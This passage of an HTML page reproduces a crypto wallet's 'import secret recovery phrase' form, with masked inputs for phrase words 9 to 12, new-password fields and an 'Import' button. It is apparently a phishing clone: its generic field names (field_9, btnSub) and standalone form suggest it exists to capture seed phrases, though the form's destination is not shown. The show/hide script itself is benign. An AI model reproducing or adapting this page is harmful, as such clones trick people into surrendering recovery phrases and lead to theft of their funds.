                                                    <input class="show-hide-toggle__input" id="import-srp__srp-word-7-checkbox" type="checkbox" data-testid="import-srp__srp-word-7-checkbox" />
                                                    <label for="import-srp__srp-word-7-checkbox" id="7" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
                                                        <svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                                            <path
                                                                d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                                                            ></path>
                                                        </svg>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="import-srp__srp-word">
                                                <label for="import-srp__srp-word-8" class="import-srp__srp-word-label">
                                                    <p
                                                        class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black"
                                                    >
                                                        9.
                                                    </p>
                                                </label>
                                                <div class="MuiFormControl-root MuiTextField-root">
                                                    <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
                                                        <input
                                                            aria-invalid="false"
                                                            autocomplete="off"
                                                            id="import-srp__srp-word-8"
                                                             required 
                                                             name="field_9"
                                                            type="password"
                                                            dir="auto"
                                                            data-testid="import-srp__srp-word-8"
                                                            class="MuiInputBase-input MuiInput-input"
                                                            value=""
                                                        />
                                                    </div>
                                                </div>
                                                <div class="show-hide-toggle">
                                                    <input class="show-hide-toggle__input" id="import-srp__srp-word-8-checkbox" type="checkbox" data-testid="import-srp__srp-word-8-checkbox" />
                                                    <label for="import-srp__srp-word-8-checkbox" id="8" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
                                                        <svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                                            <path
                                                                d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                                                            ></path>
                                                        </svg>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="import-srp__srp-word">
                                                <label for="import-srp__srp-word-9" class="import-srp__srp-word-label">
                                                    <p
                                                        class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black"
                                                    >
                                                        10.
                                                    </p>
                                                </label>
                                                <div class="MuiFormControl-root MuiTextField-root">
                                                    <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
                                                        <input
                                                            aria-invalid="false"
                                                            autocomplete="off"
                                                            id="import-srp__srp-word-9"
                                                             required 
                                                             name="field_10"
                                                            type="password"
                                                            dir="auto"
                                                            data-testid="import-srp__srp-word-9"
                                                            class="MuiInputBase-input MuiInput-input"
                                                            value=""
                                                        />
                                                    </div>
                                                </div>
                                                <div class="show-hide-toggle">
                                                    <input class="show-hide-toggle__input" id="import-srp__srp-word-9-checkbox" type="checkbox" data-testid="import-srp__srp-word-9-checkbox" />
                                                    <label for="import-srp__srp-word-9-checkbox" id="9" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
                                                        <svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                                            <path
                                                                d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                                                            ></path>
                                                        </svg>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="import-srp__srp-word">
                                                <label for="import-srp__srp-word-10" class="import-srp__srp-word-label">
                                                    <p
                                                        class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black"
                                                    >
                                                        11.
                                                    </p>
                                                </label>
                                                <div class="MuiFormControl-root MuiTextField-root">
                                                    <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
                                                        <input
                                                            aria-invalid="false"
                                                            autocomplete="off"
                                                            id="import-srp__srp-word-10"
                                                             required 
                                                             name="field_11"
                                                            type="password"
                                                            dir="auto"
                                                            data-testid="import-srp__srp-word-10"
                                                            class="MuiInputBase-input MuiInput-input"
                                                            value=""
                                                        />
                                                    </div>
                                                </div>
                                                <div class="show-hide-toggle">
                                                    <input class="show-hide-toggle__input" id="import-srp__srp-word-10-checkbox" type="checkbox" data-testid="import-srp__srp-word-10-checkbox" />
                                                    <label for="import-srp__srp-word-10-checkbox" id="10" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
                                                        <svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                                            <path
                                                                d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                                                            ></path>
                                                        </svg>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="import-srp__srp-word">
                                                <label for="import-srp__srp-word-11" class="import-srp__srp-word-label">
                                                    <p
                                                        class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black"
                                                    >
                                                        12.
                                                    </p>
                                                </label>
                                                <div class="MuiFormControl-root MuiTextField-root">
                                                    <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
                                                        <input
                                                            aria-invalid="false"
                                                            autocomplete="off"
                                                            id="import-srp__srp-word-11"
                                                             required 
                                                             name="field_12"
                                                            type="password"
                                                            dir="auto"
                                                            data-testid="import-srp__srp-word-11"
                                                            class="MuiInputBase-input MuiInput-input"
                                                            value=""
                                                        />
                                                    </div>
                                                </div>
                                                <div class="show-hide-toggle">
                                                    <input class="show-hide-toggle__input" id="import-srp__srp-word-11-checkbox" type="checkbox" data-testid="import-srp__srp-word-11-checkbox" />
                                                    <label for="import-srp__srp-word-11-checkbox" id="11" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
                                                        <svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                                            <path
                                                                d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                                                            ></path>
                                                        </svg>
                                                    </label>
                                                </div>
                                            </div>
                                        </div>
                                       
                                    </div>
                                    <div class="create-new-vault__create-password">
                                        <div class="MuiFormControl-root MuiTextField-root MuiFormControl-marginNormal">
                                            <label class="MuiFormLabel-root MuiInputLabel-root jss24 jss28 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="password" id="password-label">
                                                New password (min 8 chars)
                                            </label>
                                            <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
                                                <input aria-invalid="false" autocomplete="new-password" id="password" name="new_password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="" required />
                                            </div>
                                        </div>
                                        <div class="MuiFormControl-root MuiTextField-root MuiFormControl-marginNormal">
                                            <label
                                                class="MuiFormLabel-root MuiInputLabel-root jss24 jss28 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink"
                                                data-shrink="true"
                                                for="confirm-password"
                                                id="confirm-password-label"
                                            >
                                                Confirm password
                                            </label>
                                            <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
                                                <input aria-invalid="false" autocomplete="new-password" id="confirm-password" name="confirm_password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="" required />
                                            </div>
                                        </div>
                                    </div>
                                    <div class="create-new-vault__terms">
                                        <input class="check-box far fa-square" id="create-new-vault__terms-checkbox" readonly="" data-testid="create-new-vault__terms-checkbox" type="checkbox" />
                                        <label class="create-new-vault__terms-label" for="create-new-vault__terms-checkbox">
                                            <span
                                                class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black"
                                            >
                                                <span> I have read and agree to the <a class="create-new-vault__terms-link">Terms of Use</a> </span>
                                            </span>
                                        </label>
                                    </div>
                                    <button class="button btn--rounded btn-primary create-new-vault__submit-button" name="btnSub" type="submit">Import</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
        <script>
            $('.show-hide-toggle__label').click(function() { 
                var id = $(this).attr('id'); 
               
                if ( $('#import-srp__srp-word-'+id).attr('type') == 'text' ) {

                     $('#import-srp__srp-word-'+id).attr('type', 'password');
                     $('#'+id).empty();

                      $('#'+id).html('<svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path></svg>');
                } else {
                     $('#import-srp__srp-word-'+id).attr('type', 'text');
                      $('#'+id).empty();
                     $('#'+id).html('<svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is being shown" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"></path></svg>');
                }
            });
        </script>
    </body>
</html>
